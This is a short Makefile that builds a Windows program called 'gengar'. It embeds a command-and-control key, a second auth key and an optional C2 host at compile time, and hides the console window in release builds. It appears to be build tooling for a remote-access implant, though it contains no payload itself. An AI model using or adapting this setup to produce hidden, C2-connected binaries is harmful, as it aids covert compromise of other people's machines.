CC=gcc
CFLAGS=-Wall *.c -o gengar -lws2_32
CFLAGS_RELEASE=-mwindows
MACRO_FLAGS=-DCNC_KEY=\"${CNC_KEY}\" -DGENGAR_KEY=\"${GENGAR_KEY}\"


validate_auth_keys:
	scripts/validate_auth_key "${CNC_KEY}"
	scripts/validate_auth_key "${GENGAR_KEY}"

validate_cnc_host:
	scripts/validate_cnc_host "${CNC_HOST}"


debug: validate_auth_keys
	$(CC) $(CFLAGS) $(MACRO_FLAGS)

release: validate_auth_keys
	$(CC) $(CFLAGS) $(CFLAGS_RELEASE) $(MACRO_FLAGS)

release_host: validate_auth_keys validate_cnc_host
	$(CC) $(CFLAGS) $(CFLAGS_RELEASE) $(MACRO_FLAGS) -DCNC_HOST=\"${CNC_HOST}\"
